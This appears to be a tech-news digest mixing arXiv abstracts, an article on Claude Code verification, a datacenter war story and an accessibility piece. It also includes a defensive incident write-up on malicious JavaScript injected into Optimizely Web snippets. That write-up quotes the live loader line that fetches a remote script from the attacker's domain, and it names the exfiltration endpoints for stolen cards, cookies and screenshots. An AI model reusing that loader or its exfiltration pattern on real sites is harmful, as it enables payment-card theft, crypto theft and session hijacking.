Benchmark Factory Uses Quality Anchors To Curate Coding Evals
Why: Automates benchmark creation for your agentic evals without manual labeling overhead.
arXiv cs.AI ↗extracted 04:00 · 258 words

Benchmark Factory is an autonomous meta-agent that generates coding benchmarks from production code using label-free quality anchors. It validated tasks without human annotation and correctly identified relative model strengths across five cohorts.

Read the extracted text ↓

View PDF HTML (experimental)

Abstract:Teams deploying coding agents need benchmarks built from their own code, but curating and validating them by hand is resource intensive, and an unvalidated benchmark can mislead silently. We present Benchmark Factory, an autonomous meta-agent loop with human checkpoints: an LLM agent writes sourcing queries over landed production code changes, runs models of known relative strength on each candidate, diagnoses why a candidate fails, and repairs it by editing its queries, prompts, and configuration until it clears quality anchors that need no per-task human labels. We used Benchmark Factory to build benchmarks for five developer cohorts at our organization. Engineering raters scored a 5% sample 2.3 for task quality and 2.6 for grader verdicts on a 1-to-3 scale. On configurations never used to build them, the benchmarks ranked Claude Opus~4.7 at high reasoning effort above low effort (60.6% vs. 54.4% of tasks passed, $p=0.002$) and GPT-5.5 above GPT-5.4 (65.8% vs. 60.5%, $p=0.004$); 9 of the 10 per-cohort comparisons pointed the same way. A deliberately trivial benchmark failed the anchors; five broken graders failed them, even under a relaxed rule fixed in advance that the real grader passes; and with model labels shuffled so that no true ordering existed, random redraws of a candidate passed in at most 1.4% of simulations. The anchors are necessary, not sufficient, conditions for a valid benchmark, designed to focus human review on what the loop cannot repair.

Authors:Samuel Stanton (1), Aaron Solomon (2), Emily Delaney (2), Melanie Montgomery (2), Crystal Humphries (2), Timothy Acker (2), Ryan Henrici (2), Charbel Eid (2), Eddie Abrams (2), Peyton Greenside (2) ((1) Anthropic, (2) BigHat Biosciences)

View PDF HTML (experimental)

Abstract:Lab-in-the-loop systems, in which a model proposes molecules, automated assays measure their properties and the results retrain the model, are a popular approach to antibody lead optimization. These systems optimize for a specification defined with metrics computed from instrument signals, so their success depends on how well those metrics serve as proxies for the properties a drug candidate needs. When a metric is a poor proxy, neither a better model nor more data will fix it, and identifying the problem usually requires expert review. We report two campaigns run on BigHat Biosciences' Milliner platform, one on an anti-albumin nanobody (VHH) and one on an anti-mesothelin single-chain variable fragment (scFv), in which a research team and a general-purpose AI agent, Claude, brought scientific reasoning into the loop. Over seven rounds and about 1,010 design variants we built libraries from antibody lineage, structure and biophysics, and found from the raw curves that on each scaffold one thermal metric did not measure what its name implied. The libraries were built as controlled comparisons, so the results also show what each mutation contributes to each property. We fit a physical model of the curves, used it to choose metrics suited to each scaffold, and changed the experimental protocol, varying protein concentration and heating rate, to test the model against pre-registered predictions. Both leads improve on their parents in affinity, thermal stability and aggregation while improving or maintaining yield and purity.

SplitZip Delivers 2.1 Terabytes per Second KV Decompression
Why: This removes transfer bottlenecks in your disaggregated agents, improving time-to-first-token and request throughput.

Researchers introduced SplitZip, a lossless compression technique for disaggregated LLM serving that targets the KV cache transfer bottleneck. The method exploits redundancy in BF16 exponents using a top-16 codebook and sparse escape streams to achieve 613.3 GB/s compression and 2181.8 GB/s decompression throughput. It eliminates online histogramming, allowing compression of KV activations at the speed of prefill generation.

Read the extracted text ↓

View PDF HTML (experimental)

Abstract:Contemporary systems serving large language models (LLMs) have adopted prefill-decode disaggregation to load-balance between the compute-bound prefill phase and the memory-bound decode phase. Under this design, prefill workers generate a KV cache that must be transferred to decode workers before generation can begin. With these workers residing on different physical systems, this transfer becomes a significant bottleneck to serving LLMs at scale, especially for long-input and agentic workloads. Existing lossless codecs are unsuitable here as they primarily target offline weight compression, run on CPUs, or use variable-length coding whose compression cannot keep up with KV production during prefill. We introduce SplitZip, a GPU-friendly lossless compressor for KV cache transfer that preserves KV tensors bitwise and integrates into existing serving frameworks without modifying model execution. SplitZip exploits redundancy in floating-point exponents of KV activations, encoding frequent exponent values with fixed-length codes and routing rare exponents through a sparse escape stream of (position, value). A calibrated top-16 exponent codebook eliminates online histogramming, while the regular dense path and sparse escape correction make both encoding and decoding efficient on GPUs. On real BF16 activation tensors, SplitZip achieves $613.3$ GB/s compression throughput and $2181.8$ GB/s decompression throughput, outperforming prior lossless compressors on the critical codec path. End-to-end transfer experiments show up to $1.32\times$ speedup for BF16 KV cache transfer, $1.30\times$ speedup for TTFT, and $1.23\times$ increase in Request Throughput. The same approach extends to FP8 KV caches, providing up to $1.14\times$ compression over native E5M2. Code is available at this https URL

Authors:Yehua Huang, Penglei Sun, Xiang Li, Jinhao Zhou, Jiawen Wen, Qingqing Xiao, Zihan Yang, Wenqi Wang, Haolan Chen, Yu Xu, Xiaowen Chu

View PDF HTML (experimental)

Abstract:Recognizing individual events does not guarantee correct execution of compositional instructions in streaming video. For example, given the request "Notify me when the pot boils after someone turns on the stove and leaves the kitchen", existing models may recognize the individual events yet notify too early or miss the intended moment, failing to track how their temporal conditions are satisfied over time. To evaluate this gap, we introduce CoTriggerBench, which composes annotated video events into temporally constrained instructions and verifies notification timing and silence through executable event plans and source-event replay. To address this challenge, we propose a real-time VLM agent, TEMPI. TEMPI decomposes instructions into atomic event queries and temporal constraints, and uses Scenario Memory to continuously maintain task progress as event evidence arrives, allowing earlier observations to support subsequent decisions beyond the detector's visual window. Even when no notification is required, relevant events continue to update the scenario state. On CoTriggerBench, TEMPI achieves 44.4% instruction-level success, outperforming the strongest closed-source and fine-tuned open-source VLM baselines by 15.6 (Qwen3.8-Omni-Flash-Realtime) and 18.1 (MOSS-VL-Realtime) percentage points, respectively. To support efficient on-device streaming inference, we further optimize the streaming inference pipeline by overlapping partial visual encoding and LLM prefix prefill with frame arrival. On an 8 GB RTX 5060, our optimized detector implementation achieves a 4.90$\times$ speedup.

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

A plain <script> tag pointing at https://1688360.cc/track.js (most snippets).

The same URL hidden in base64 with atob(). A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.

A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

Timeline (UTC)

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

What the payload does

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

page text, form fields, links and images;

the clipboard, on copy and through navigator.clipboard;

outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

the page URL;

document.cookie (cookies not marked HttpOnly);

the original addresses it replaced;

a screenshot of the page, rendered with html2canvas.

4. iOS exploit kits: Coruna and DarkSword

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

How Report URI would have detected, or even prevented, this attack

Every one of these needs only a CSP in Report-Only mode, so nothing on the site breaks:

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Did Content Security Policy help?

We crawled 256 of the affected organisations' own hosts and evaluated their CSP against what this payload needs:

Load track.js from 1688360.cc.

Or run the inline fallback, which needs 'unsafe-eval' or 'unsafe-inline'.

Send stolen data to 1688360.cc (connect-src).

Load the iOS kit (script-src, frame-src).

Allowing cdn.optimizely.com was never going to help. The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive script-src. A site that lists only the hosts it needs blocks 1688360.cc. Two common settings let it straight through:

'strict-dynamic': any script the trusted Optimizely snippet inserts is trusted too.

'unsafe-eval', which Optimizely's own documentation tells customers to allow: the inline-fallback version ran through eval even where track.js was blocked. That is what happened at HSBC. Its CSP blocked track.js and the data theft, but the inline copy still ran.

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

What to do now

If your site uses Optimizely Web:

Open every project's Project JavaScript and every experiment's custom code. Look for 1688360.cc, atob( and any script you didn't write.

Review who and what has write access to your Optimizely account (users, API tokens, integrations) and rotate credentials.

If you have card fields in your own forms, treat cards entered on 16 November as potentially exposed.

Treat any session tokens or secrets in non-HttpOnly cookies as exposed, and rotate them.

Deploy a CSP. Restrict connect-src, avoid 'unsafe-eval' where you can, and turn on reporting.

Consider if you need to communicate to your customers about having served them malware.

If you visited an affected site on 16 November:

Update your iPhone or iPad to iOS 18.7.3 or later, or iOS 26.3 or later.

Check any crypto transfer you made. If the address you pasted doesn't match the one you meant to pay, it may have been swapped.

Watch your card statements if you paid by card on an affected site.

Claude Code uses parallel verification loops and graded checks
Why: Your agentic pipelines require this architecture for mass-parallel validation
Hacker News ↗HN 71↑extracted 04:00 · 2,263 words

On the Claude Code team, the vast majority of our code (~90%) is written and reviewed by Claude. At this scale, how we equip our agents to verify their work with evidence becomes extremely important.

Verification loops are the building block that lets you delegate more work to Claude. Without them, you can really only run one or two Claudes at a time, because you have to check everything yourself. With them, you can run dozens or hundreds in parallel.

That’s because giving agents a way to verify their output is an effective way to improve quality. In internal testing around structured file generation, having a separate grader check Claude’s work against a rubric improved task success by up to 10 points over a standard prompting loop, with the largest gains on the hardest problems.

What was once expensive to verify (tests, benchmarks, specs, real end-to-end runs) is now cheap to request from an agent. Like code, agents can quickly generate tests, benchmarks, and specs. And once generated, these tests and benchmarks run as software so they can be run frequently without using many additional tokens.

You can also close the verification loop by using the results to improve the agent’s performance on that task. For example, if an agent repeatedly fails a test that checks logs for user data, you can create a hook or a more explicit rule in your CLAUDE.md to avoid future issues. This (mostly) stops issues from happening again.

So if verification is critical to producing quality code at a high velocity, what types of tests should you use and how should you apply them across your pipeline? This article answers those questions and also shares the process used by the Claude Code team.

NOT ALL TESTS ARE CREATED EQUAL: 3 TESTS WORTH INVESTING IN

No matter which test type you choose, there are a few failure modes to avoid.

If your tests are flaky you’ll train the agent to run them again rather than fixing the failing code. If your tests are slow, the agent will do fewer tests across batches which can make pinpointing issues difficult. Heavier tests are best deployed before you’ve committed the changes.

Now, here are the three types of tests I think are most worth investing in.

E2E tests

If you have to focus on one test type, pick end-to-end. These tests describe real user flows like adding an item to a cart, checking out, and moving to a confirmation page.

The reason E2E tests are so effective is that they are difficult to fool–either the whole feature works or it doesn't. They also have definitive done criteria and can concretely tell you what’s broken.

FIG AA unit test may show “Error: Timeout after 30 seconds,” but an end-to-end test can show a screenshot with a description of what’s broken.

While unit tests are faster and less flaky, it’s possible to pass them and still break the feature. This is because both the agent and the test don’t understand the full task.

With E2E tests, it is effective to give your agent hands and eyes on the real running system. You can use a skill to boot, drive, and inspect the app with tools like CDP, simulators, or API harnesses.

The feature map can serve as a guide and grading rubric for agents as they typically list features from the user’s point of view with descriptions of paths, keyboard shortcuts, selectors, and expected results.

Property tests: constraints that can’t break

A lot of tests are based on what you thought might go wrong. Property tests look at the edge cases that people tend to miss, which is where agents often fail.

You start by writing a statement you think can’t fail and then use a test library (fast-check for JS/TS, Hypothesis for Python, proptest for Rust, etc.) to generate thousands of inputs that try to prove otherwise.

There are many properties in virtually every software project like:

Round-trip encoding: “if you encode X then decode it back, you get X.” This works for parsing and serialization as well.

Invariants: Things that must always be true, like “account balance can never become negative.”

Idempotency: Doing an action (migration, normalization, retry) twice has the same effect as doing it once.

Equivalence: Optimized code produces the same result as naive but correct code.

Property libraries are a great way to keep agents honest by using edge cases that aren’t created with the same bias as the agent that created the original code. They are also particularly helpful for rewrites when the spec has drifted from production behavior and is no longer a reliable source for verification.

Differential tests: the old system is the oracle

Differential tests are particularly effective for large-scale migration use cases where functionality is expected to remain the same. For these tests, you run both the old system and the new system with the same inputs and see if you get different results. If you do, there is a bug or breaking change that needs to be fixed.

The key for differential tests is to use randomly generated inputs or a sample of production traffic. You’ll also want to normalize irrelevant factors like whitespace and keep a list of approved changes for situations where the new environment should differ from the old.

HOW THE CLAUDE CODE TEAM THINKS ABOUT VERIFICATION

We have previously written about how code review works at Anthropic, but this article aims to go deeper on how we verify our work.

Verification means running the change

Running the app end to end matters more than tests. You wouldn't ship an iOS change without trying it in a simulator, and the same goes for Claude.

Claude can test the whole app the way a human or QA engineer would. Ask it to use the Claude Chrome extension for web changes, an iOS or Android MCP for mobile, computer use for desktop, or to run the service locally for backend work.

To codify how to start the simulator or run your app, create a skill called verify. Put it in a .claude/skills/ folder in your repo, as close to the relevant code as you can, and add as many as you need. Claude knows to use the verify skill before committing changes.

Then invest in making your verify skill fast and reliable. Ask Claude to iterate on it and stress test it. It's your smoke test harness, so you want it rock solid.

When you give Claude a way to smoke test its changes end to end, you get much better results. You'll see it iterate and catch real mistakes faster, the way a human would. This is how we test nearly all changes at Anthropic.

Failing tests require human attention

Nobody can read every change, so we use failures as one way to decide what needs a person. Claude runs the checks and tries to fix anything that fails. If a check is still failing after three rounds, Claude stops and brings in a human.

Code owners write their own checks

The people who own the code write the checks for it, and refine them until they flag what the owner would flag. When a check pulls in a reviewer, it should say why, so they don't have to work it out from the diff.

Reliability checks trigger on the diff

We maintain a reliability checklist with 39 items, each with a trigger that can be read from a diff, a check, and the incidents or PRs behind it. One is “--resume loads old transcripts.” When session storage or message types change, we ask whether a new field loads safely, since older transcripts won’t have it.

Claude reads the diff and checks only the items whose trigger matches–usually 3 to 10–so nobody has to memorize past outages.

One reviewer, multiple rounds

We don't try to improve reviews by stacking on more reviewers. Adding a second, more expensive, reviewer on top of the primary one is often a worse approach than tuning the primary. Instead, we have a REVIEW.md that says what the reviewer should pay attention to for this code.

We also think review and verification rounds should build on each other. We point each pass at context from earlier rounds and past failures rather than re-checking everything from scratch. It’s cheaper and finds more.

Changes can't modify their own checks

If a change can modify the check that judges it, the check is broken. Code Review reads the REVIEW.md file from the base or default branch, never from the pull request's changes. The Claude Code team ensures the rules that gate changes are on a branch that the change can't modify.

The Claude Code team also reserves reviews for commits. If someone's pushing while the review is happening, then the review result is no longer useful. A passing review on an out-of-date commit means nothing.

The team also runs cheap checks first. If an agent pushes before testing locally, it has spent shared review and CI time when it could have caught the bug itself. On our team, Claude runs the tests, build, and linter before opening a pull request. You can enforce this with a hook that runs the tests when Claude finishes, or a /goal of a passing test suite.

Start a new gate in observe mode

In our own repos, we stamp each commit with how it was verified. The stamp even includes "none" so we can query for commits that weren't verified.

We've also created a commit gate that can block a commit if the session did not contain /code-review or /verify. We've set it up with off, observe, and enforce modes.

Observe mode will log what would have been blocked, so that we can review any false positives and ensure no one is impacted.

Enforce mode will block the commit. Any commit can carry an explanation in its message as to why it didn't get verified. If commits have been blocked twice in the session, the next one will be allowed through so Claude doesn't get stuck – Claude Code isn't perfect.

Test your checks on what actually matters

The Claude Code team also regularly reviews the reviewers. We track how many merged changes were reverted, how many changes a maintainer rejected before merging, and a size-matched subset of changes that have stayed clean.

This can also be done with a formal evaluation. In our code review post, we described how the Code Review team has set up an evaluation based on previous incidents and reverts. They recreate the repo to the state at the time of review for each example, and provide a one-sentence answer key to what the bug was. Only findings that correctly describe the bug in question get points. They use merged and stable changes as a control to prevent over-flagging. Their tuning set is split out from the fixed test set they use to evaluate their system.

They also evaluated the recall rate for raw findings, post-verification, and final review separately. This lets them see if the system is losing bugs it had already found. Any evaluation that treats all these as one end-to-end score won't capture this nuance.

In addition to validity, the other dimension we care about is how important it is to make the change. A good reviewer will catch most things that are technically correct, but people care about whether a given bug is a must-fix, a should-fix, or a nit.

Code Review has this exact idea, and it will tag things as Important, Nit or Pre-existing. The "pre-existing" tag means that the reviewer shouldn't hold the author responsible for something that was already a bug.

Finally, the Claude Code team tunes recall up to the point where the next improvement would be overfitting to the eval rather than actually catching bugs.

Turn misses into rules

In the Claude Code repo, we have two methods of turning missed cases into rules. The first is extracting patterns in human code review comments and PR reverts to identify common issues. These must occur in at least two PRs and be identifiable from a diff to be considered a potential rule. Three agents will try to disprove them, and they will be reviewed and approved by a human in a PR.

The second method is replaying three bug finders against a PR that is associated with a known incident. If at least two find the bug, it's a detectable bug. If the bug is missed on a small diff, this is a gap that is worth turning into a rule in REVIEW.md.

Flaky tests get the same treatment. Claude can't skip them, add sleeps or retry until they pass. If it can't find the root cause, it deletes the test and writes down why.

Rules need cleaning up too. Test suites, verification steps and .md files only grow if you let them, so we tidy them up on a routine.

GOOD TESTS, GOOD RESULTS

We’ve found that giving your agent a way to verify its work with a strong feedback loop makes all the difference. Treat your verification layer like you would any other system. Keep it out of reach of the changes they judge, grade them against the bugs that mattered to you, and write down lessons when they miss something so that it doesn’t happen more than once, and prune those lessons so they stay worth running.

Do that and your job shifts from reading every diff to defining what “done” looks like and reviewing the evidence, which is what lets you run many Claudes at once.

A war story from Jane Street's systems team: a false smoke alarm, a datacenter with no cooling, and a sprint to pull every power cord before the sprinklers went off

Everyone’s heard of how awesome Jane Street is. Fewer people have heard about the times something stupid nearly put it out of business and it was saved by grit and dumb luck. I was on the systems team for some of those. Jane Street didn’t do titles, and we on the systems team weren’t above getting our hands dirty. You could think of us as the firm’s blue-collar OCaml programmers: when something broke, we were the ones running through the corridors to fix it. Call this story a Star Trek: Lower Decks view of Jane Street.

For the longest time Jane Street insisted on having its machine room close to its trading floor. When it was 10 people it was cute. When it was 150 people it was starting to feel… odd. Part of the reason for this was intellectual property concern: they didn’t want to risk having their servers stolen by spies who would learn their precious trading strategies. Another reason was technology risk: they wanted to make sure out-of-control automated trading systems could always be shut down by running across the hall and pulling power cables.

Yes, tools existed to mitigate both of these fears. But Jane Street moved irritatingly slowly on this stuff, and they still wanted the last-resort option of yanking power cords. Their risk culture didn’t exclusively come from reading heady thinkpieces. A lot of it was instilled by a partner who’d served on a nuclear submarine, and it showed, mostly in a good way! On a sub, you don’t trust the automation unless there’s a big red-painted, mechanically connected lever you can pull to turn it off.

As the company grew this humble machine room was built out into a respectably sizable datacenter, complete with an online UPS, Computer Room Air Conditioner (CRAC) units, refrigerator-sized network switches, a subterranean diesel backup generator and about 10 rows of server cabinets, 10 cabinets deep. Oh, and it was all crammed into the middle of a skyscraper called 1 New York Plaza, which was otherwise just a normal office building.

When I first landed my job at Jane Street I was commuting to the southern tip of Manhattan all of the way from Queens, an hour or more each way. I’d gone to a magnet high school in the city, so I’d been doing commutes like that since I was a teenager, and I was tired of it.

Now that I was making big Wall Street money I decided I’d get an apartment. A real estate agent kept trying to show me what they called “panty droppers”, but I was only interested in one thing: proximity to the office. I ended up in a 200 square foot studio that was a 9 minute commute on foot from my apartment door to my desk on the trading floor. I would weirdly boast about it to the rest of the systems team, but it also meant everyone at the office knew I was a stone’s throw away in case there was an emergency.

And that day came soon enough. One evening after work, just as I was about to climb into the elevator at my apartment building, my phone rang. It was our Hong Kong office, and when Hong Kong had a New York problem, mine was (now) the number they called. The smoke alarm in our NYC datacenter had gone off.

We had contractors working on a prep room next to the datacenter. While cutting into stuff, some dust was kicked up and it set off the smoke alarm. This is bad, but not for the reason you might think. Office buildings have sprinklers in them for fire suppression. You may have seen it go off in movies where someone just holds a lit cigarette up to the sprinkler on the ceiling and it floods the entire room. In reality they’re not quite that dumb, but it’s close.

Firstly, the sprinklers over a machine room like ours usually aren’t kept full of water all of the time. This saves you from having to deal with any leaks that might develop overhead over the years. Secondly, the sprinkler heads don’t have smoke sensors. Instead, a different system detects the smoke, and that’s when the pipes fill with pressurized water, but they don’t spray yet. What triggers the spray is heat: each sprinkler head has its own heat-sensitive plug, which opens once the air around it becomes hot enough. The logic is that the smoke alarm must be real, whatever fire triggered it hasn’t been brought under control since it’s gotten very hot, and the sprinklers should douse it with water.

Of course, the ceiling of our datacenter was full of sprinklers set up exactly this way. We’re still fine because even though contractors might have set the smoke detector off by kicking up dust, there’s no actual fire producing heat, so the sprinklers wouldn’t spray, right? Well, no. One final piece of this contraption is that if the smoke alarm detects smoke, it would be absolutely terrible to keep circulating air through the room since that would help feed any fires, so the smoke alarm is wired to shut down the CRAC units(!)

Can you see the problem now? Rooms full of computer racks have high cooling demands. If you shut down the cooling, the temperature starts climbing. If you have a bunch of sprinklers that have just become pressurized because of a smoke alarm, you now have a serious, potentially business-ending problem on your hands.

And so my mission was made clear: as fast as I possibly could, get back to Jane Street, get into the machine room, and pull the power cord on every device in that room before the temperature climbed past 150 F and the sprinklers destroyed everything.

I ran down the (ironically named) Water Street in the Financial District faster than probably anyone has ever run down it, mashed the elevator button in the lobby of 1 NYP, waited very impatiently for the elevator to climb the 33 floors, slammed my keycard against the reader, booked through the main office door, took a hard right turn to the machine room door, slammed my keycard against that, stepped into what felt like a sauna and went row by row, cabinet by cabinet, yanking power cables out with both hands.

Then I watched the temperature monitor. 141 F. 142. 143. 143.5. 143.6. Finally it stopped. A quiet I’d never heard before set in on the machine room.

The machine room had been kept across the hall so that someone could always run in and pull the power cords. I doubt anyone had pictured doing it to save the servers from the goddamn sprinklers.

Since the major NYC markets were closed for the day, the downtime from this fiasco was minimal, and we were up and running the next morning.

There were a couple of meetings after that. You might picture Gordon Gekko coldly deciding whose career was over, but meetings at Jane Street were never like that. They were matter-of-fact, level-headed and honestly kind of fun, closer to engineering students in a college dorm arguing over what went wrong. The outcome of all that level-headed discussion: the sprinklers would stay, we would tighten up procedures and surveillance, and we would continue hosting servers in our office building right next to our trading floor. That is, until Hurricane Sandy smacked us upside the head, but that’s a story for another day.

As for me, when the next morning came around I knew what had to be done. Our Hong Kong team had only caught the problem by luck: someone happened to see on a display that server after server was popping up a climbing temperature condition. No one server was configured to alert just because it was a little hot, since that happens from time to time. But an across the board increase in temperature on many servers means there’s a generalized cooling failure.

What we needed was a system monitor built for this exact purpose, one we could trust to be ultimately, unfailingly reliable at the task of asking each Linux server for its temperature and computing a simple mean. Bash wouldn’t cut it for this. Nor would Perl. No, a job of this magnitude called for the most reliable and type-safe programming language imaginable. So I fired up emacs and wrote it in good old OCaml: every minute, ask every server in each location directly for the temperature from its onboard sensors, take the average, and if it’s elevated, blast an alert out to everyone on the systems team to check for datacenter overheat.

Yes, we could have also alerted if the CRAC units shut down or if a dedicated temperature sensor in the room was high, but the telemetry for this stuff was nowhere near as reliable, and unknown unknowns can still ruin you, so the most durable thing sometimes really is to ask your fleet of Linux boxes for their temperature and freak out if the average is just a little too high.

Our team didn’t interact much with the partner with the nuclear sub experience, but I’d like to think he would have approved.

Accessibility, Testing, AI

Lately, I’ve been thinking and writing a lot about what AI is doing to product development, and what that means for accessibility. The thing that has my wheels turning is a finding from Level Access’s 2026 State of Digital Accessibility Report. Basically: AI is helping us hit fast-forward on the build, but testing practices haven’t kept up.

We asked more than 2,500 professionals where they noticed AI was speeding up their work in the SDLC. Most said they noticed gains in planning (58%), design (61%), and development (51%). But QA and testing lagged behind: Only 30% said AI had sped up that stage.

These results point to a two-speed workflow. AI has turbocharged design, planning, and development, while checking and validation are still running at a very different pace. This means a lot of teams are likely racing through the build, then being forced to hit the brakes the moment someone has to answer a pretty fundamental question: Is this thing actually accessible?

Accessibility has historically been treated as a QA bottleneck, and AI is pushing far more work into it, faster. If your team has already shifted left on accessibility, you’re off to a good start. But AI has reshuffled the workflow, so even proactive teams need to work out where those early checks belong now.

This matters because right now, the web is moving in the wrong direction. WebAIM’s latest scan of the top million home pages found that automatically detected errors per home page rose 10.1% in a year, from 51 to 56.1 per page. WebAIM cited AI-assisted coding as one possible contributing factor.

So how do we get validation out of first gear? How do we build human judgment into the workflow as AI keeps pushing the pace?

AI Isn’t The Biggest Differentiator

We looked at the organizations that are improving across every accessibility metric they track (a group we call the “improvers”) to find out what they’re doing differently.

Here’s what stood out: AI adoption made the smallest difference of anything we measured. Improvers use AI at a similar rate to everyone else we surveyed. Their edge shows up in the maturity of their surrounding accessibility practices — things like training, communication, and a culture of accessibility.

A quick caveat: This is survey data, so it only shows correlation, and mature programs may simply be better at tracking and reporting their wins. Even so, this finding was hard to ignore.

And it got even more interesting. Professionals in mature accessibility programs were nearly six times as likely to say AI helps them prioritize issues. They were also nearly three times as likely to say it helps them tackle accessibility more proactively in development.

In other words, AI works best as an amplifier of a strong program. With context, testing, environments, and guardrails in place, agents can take on a large share of the work from drafting through to operations, and much of the time lost to waiting and handoffs goes away. People stay responsible for deciding what to build and for approving what ships.

So let me ask you: When it comes to accessibility, where does human judgment sit in your workflow today?

Not sure? Here’s a quick way to find out.

Pick a feature you shipped recently and trace it from the first Figma frame to production. Mark every moment a person decided whether it would work for someone using a keyboard, a screen reader, or their browser at 400% zoom.

How many marks did you get? If most of them cluster at the end of creation, you’re likely heading to one of two places: You’ll either ship accessibility barriers or spend the time you saved upstream fixing them later, when they’re harder and costlier to fix.

Here’s how to avoid both outcomes by building the right accessibility checks and judgment calls into the work your team is already doing.

Build The Judgment Calls Into Your Workflow

As AI takes on more work, people need to stay involved at three points: finding issues, fixing them, and documenting the evidence. Each one plugs into a step your team already takes, like a handoff, a pull request, or a review, so nothing new gets added to the timeline, and accessibility keeps pace with the work that’s in motion.

1. Find: Catch Issues While The Work Is Still Warm

Context fades fast. Put the first judgment checkpoints as close to the creation work as you can:

Start at the handoff.Spell out focus order, accessible names, states, heading structure, and what gets announced when something changes or goes wrong. If you leave anything vague, the model fills the gap with its own defaults. Then, put it where the model reads it: your design system components, rules files (Cursor rules, AGENTS.md, Copilot instructions), and prompt templates, not only a spec document. For designers, free annotation kits make this concrete. GitHub’s Annotation Toolkit offers Figma components for marking headings, landmarks, focus order, and keyboard behaviour on the canvas, so the intent travels with the file instead of living in someone’s head.

Gate the pull request.Run checks in your CI/CD pipeline and at the pull request. Let them block or warn on a merge. Compare against a baseline so you only review changes. (This is the automated half of the gate: The human half of this same checkpoint shows up again under Fix). Most teams already have the tooling in place for this, but what is new is volume. AI-assisted pull requests arrive faster than reviewers can read them, so the automated gate matters more, not less. In React projects, eslint-plugin-jsx-a11y flags issues before commit, while Pa11y and Lighthouse CI scan builds for new errors. Level CI also brings accessibility testing into the CI/CD workflow, including pre-merge detection, delta findings, quality gates, and fix recommendations in pull requests.

Let automation do the sweep, send the judgment calls to people.Run automated checks across pages, screens, and documents for broad, repeatable coverage. For the sweep, QualWeb, for example, checks pages against the W3C’s ACT rules. Running your tests across several engines, like axe-core and Equal Access, can be a good idea, as one may help you catch things that the other misses. But, have people assess usability: A dropdown can pass automated checks while its submenu remains inaccessible to keyboard users.

Give every check an owner.For example, designers specify focus, errors, and states. Developers run a keyboard pass and a screen reader smoke test on custom components. (Note: Screen reader testing is harder in practice than it may seem at first, so your team might need an introductory training). UX or QA navigates the full journey. Put accessibility metrics in acceptance criteria and the definition of done, and back it with component-level tests because “everyone owns it” has a funny way of turning into “nobody did it.” When teams decide, in advance, who is responsible for each check, they create the clarity and communication that our data shows sets the organizations improving accessibility apart from those stuck fighting ever-growing backlogs.

2. Fix: Act Before The Context Goes Cold

